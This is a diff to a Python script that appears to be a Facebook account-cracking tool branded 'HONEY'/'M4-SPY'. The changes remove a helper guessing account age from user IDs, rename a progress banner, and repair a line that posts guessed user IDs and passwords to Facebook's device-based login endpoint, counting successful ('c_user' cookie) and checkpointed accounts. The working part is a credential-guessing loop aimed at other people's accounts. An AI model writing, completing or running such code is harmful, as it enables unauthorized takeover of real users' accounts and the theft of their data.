@@ -1174,39 +1174,7 @@ loop = 0
 oks = []
 cps = []
 baby =[]
-os.system('espeak -a 300 " Welcome,   to,  honey,  king,  Tools"')
 
-def Joined(ids):
-    if len(ids)==15:
-        if ids[:10] in ['1000000000']       :creation = ' 2009'
-        elif ids[:9] in ['100000000']       :creation = ' 2009'
-        elif ids[:8] in ['10000000']        :creation = ' 2009'
-        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
-        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
-        elif ids[:6] in ['100001']          :creation = ' 2010 | 2011'
-        elif ids[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
-        elif ids[:6] in ['100004']          :creation = ' 2012 | 2013'
-        elif ids[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
-        elif ids[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
-        elif ids[:6] in ['100009']          :creation = ' 2015' 
-        elif ids[:5] in ['10001']           :creation = ' 2015 | 2016'
-        elif ids[:5] in ['10002']           :creation = ' 2016 | 2017'
-        elif ids[:5] in ['10003']           :creation = ' 2018 | 2019'
-        elif ids[:5] in ['10004']           :creation = ' 2019 | 2020'
-        elif ids[:5] in ['10005']           :creation = ' 2020'
-        elif ids[:5] in ['10006','10007']   :creation = ' 2021'
-        elif ids[:5] in ['10008']           :creation = ' 2022/2023'
-        elif ids[:5] in ['10009']           :creation = ' 2023'
-        elif ids[:5] in ['61550']           :creation = ' 2023'
-        else:creation=''
-    elif len(ids) in [9,10]:
-        creation = ' 2008 | 2009'
-    elif len(ids)==8:
-        creation = ' 2007 | 2008'
-    elif len(ids)==7:
-        creation = ' 2006 | 2007'
-    else:creation=''
-    return creation
 
 #---------------------[APPLICATION CHECKER]---------------------#
 def cek_apk(session,coki):
@@ -1709,7 +1677,7 @@ def alfa(alfa,uid,pwx,tl):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write('\r\33[1;37m[M4-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M4-SPY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	
 	except:
@@ -1843,7 +1811,7 @@ def d(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
-	art ession.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -1881,4 +1849,4 @@ def d(uid,pwx,tl):
 	except:
 		pass
 
-HONEY()t
+HONEY()
